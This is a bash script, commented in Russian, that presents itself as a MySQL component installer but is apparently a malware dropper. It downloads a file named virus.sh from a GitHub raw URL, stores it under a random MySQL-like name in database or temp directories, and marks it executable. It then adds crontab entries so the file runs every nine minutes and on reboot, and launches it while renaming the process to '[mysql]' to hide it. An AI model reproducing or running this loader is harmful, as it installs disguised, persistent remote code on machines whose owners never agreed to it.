#!/bin/bash

GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/Zend1X/virus/refs/heads/main/virus.sh"
MYSQL_DIRS=("/tmp/mysql" "/var/tmp/mysql" "/dev/shm/mysql" "/run/mysqld" "/var/lib/mysql")

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Глобальные переменные
SCRIPT_PATH=""

print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
}

print_error() {
    echo -e "${RED}[✗] $1${NC}"
}

print_info() {
    echo -e "${YELLOW}[i] $1${NC}"
}

generate_name() {
    PREFIXES=("ibdata" "ib_logfile" "mysql-bin" "undo" "redo" "ibtmp" "binlog" "relay-log" "mysql" "innodb")
    RANDOM_PREFIX=${PREFIXES[$RANDOM % ${#PREFIXES[@]}]}
    RANDOM_NUMBER=$((RANDOM % 10000))
    GENERATED_NAME="${RANDOM_PREFIX}${RANDOM_NUMBER}"
    print_success "Сгенерировано имя: $GENERATED_NAME"
    echo "$GENERATED_NAME"
}

find_dir() {
    print_info "Поиск доступной директории MySQL..."
    
    for dir in "${MYSQL_DIRS[@]}"; do
        if mkdir -p "$dir" 2>/dev/null; then
            if [ -w "$dir" ]; then
                print_success "Найдена доступная директория: $dir"
                echo "$dir"
                return 0
            fi
        fi
    done
    
    print_info "Используем директорию по умолчанию: /tmp/mysql"
    mkdir -p "/tmp/mysql" 2>/dev/null
    echo "/tmp/mysql"
}

process() {
    print_info "Запуск процесса с маскировкой под [mysql]..."
    
    if [ ! -f "$SCRIPT_PATH" ]; then
        print_error "Файл $SCRIPT_PATH не найден"
        return 1
    fi
    
    if [ ! -x "$SCRIPT_PATH" ]; then
        print_error "Файл $SCRIPT_PATH не имеет прав на выполнение"
        return 1
    fi
    
    # Запускаем в фоне с маскировкой имени
    "$SCRIPT_PATH" &
    PROCESS_PID=$!
    
    # Даем процессу время запуститься
    sleep 1
    
    if kill -0 $PROCESS_PID 2>/dev/null; then
        print_success "Процесс успешно запущен с PID: $PROCESS_PID"
        # Маскируем имя процесса (если система поддерживает)
        if command -v renice >/dev/null 2>&1; then
            # Некоторые системы позволяют изменить имя процесса через /proc
            if [ -f "/proc/$PROCESS_PID/comm" ]; then
                echo "[mysql]" > "/proc/$PROCESS_PID/comm" 2>/dev/null
            fi
        fi
    else
        print_error "Процесс не запустился или завершился"
        return 1
    fi
}

main() {
    echo "==================================="
    echo "    Установка MySQL компонентов    "
    echo "==================================="
    
    local MYSQL_DIR=$(find_dir)
    local RANDOM_NAME=$(generate_name)
    SCRIPT_PATH="$MYSQL_DIR/$RANDOM_NAME"  # Присваиваем глобальной переменной
    
    print_info "Путь к скрипту: $SCRIPT_PATH"
    
    # Проверяем, существует ли уже файл
    if [ -f "$SCRIPT_PATH" ]; then
        print_info "Файл уже существует, проверяем crontab..."
    else
        print_info "Загрузка скрипта с GitHub..."
        if curl -s --fail "$GITHUB_SCRIPT_URL" -o "$SCRIPT_PATH"; then
            print_success "Скрипт успешно загружен"
            
            chmod +x "$SCRIPT_PATH"
            if [ -x "$SCRIPT_PATH" ]; then
                print_success "Права на выполнение установлены"
            else
                print_error "Не удалось установить права на выполнение"
            fi
        else
            print_error "Не удалось загрузить скрипт с GitHub"
            return 1
        fi
    fi

    print_info "Проверка наличия задачи в crontab..."
    if crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
        print_success "Задача уже существует в crontab"
    else
        print_info "Добавление задач в crontab..."
        (crontab -l 2>/dev/null
        echo "*/9 * * * * $SCRIPT_PATH >/dev/null 2>&1"
        echo "@reboot $SCRIPT_PATH >/dev/null 2>&1"
        ) | crontab -
        
        if [ $? -eq 0 ]; then
            print_success "Задачи успешно добавлены в crontab"
        else
            print_error "Не удалось добавить задачи в crontab"
        fi
    fi
    
    # Запускаем процесс только если файл существует
    if [ -f "$SCRIPT_PATH" ]; then
        process
    fi
    
    print_success "Установка завершена"
    echo "==================================="
}

# Запуск основной функции
main
